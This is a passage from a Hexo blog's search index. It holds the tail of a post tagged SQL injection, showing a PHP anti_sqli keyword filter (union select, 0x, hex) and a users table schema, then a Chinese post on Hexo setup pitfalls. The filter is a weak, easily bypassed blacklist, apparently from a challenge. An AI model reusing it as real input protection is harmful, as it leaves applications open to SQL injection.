class="title">anti_sqli</span>(<span class="params"><span class="variable">$no</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$patterns</span> = <span class="string">&quot;/union\Wselect|0x|hex/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="variable">$patterns</span>, <span class="variable">$no</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">CREATE TABLE `users` ( `no` INT NOT NULL AUTO_INCREMENT , `username` VARCHAR(100) NOT NULL , `passwd` VARCHAR(128) NOT NULL , `data` TEXT NOT NULL , PRIMARY KEY (`no`)) ENGINE = MyISAM;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo搭建遇到的坑</title>
      <link href="/2017/07/13/Hexo%E6%90%AD%E5%BB%BA%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/"/>
      <url>/2017/07/13/Hexo%E6%90%AD%E5%BB%BA%E9%81%87%E5%88%B0%E7%9A%84%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h2 id="渲染后图片路径不正确"><a href="#渲染后图片路径不正确" class="headerlink" title="渲染后图片路径不正确"></a>渲染后图片路径不正确</h2><p>使用hexo搭建github博客，使用markdown格式的相对路径(![](img.jpg&#x2F;png))引用图片，然而hexo g 后找不到图片，渲染后的图片路径为：<a href="http://localhost//img.jpg">http://localhost//img.jpg</a> </p><p>解决：hexo __config.yml 中添加：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br></pre></td></tr></table></figure><p>hexo s 后，图片是显示了，但是主题版式开始混乱……</p><h2 id="hexo-clean"><a href="#hexo-clean" class="headerlink" title="hexo clean"></a>hexo clean</h2><p>每次开启hexo时，使用“hexo c &amp;&amp; hexo g &amp;&amp; hexo s”命令，但是实际上hexo clean 没有执行，原来的文件还存在，导致渲染后找不到正确的文件或依旧保留原文件内容，重新执行“hexo clean &amp;&amp; hexo g &amp;&amp; hexo s” 主题版式恢复正常</p><h2 id="hexo-deploy"><a href="#hexo-deploy" class="headerlink" title="hexo deploy"></a>hexo deploy</h2><p>2022年部署hexo 到github时，github要求的部署密码是“personal access tokens”，而不是登录github的mm</p>]]></content>
      
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
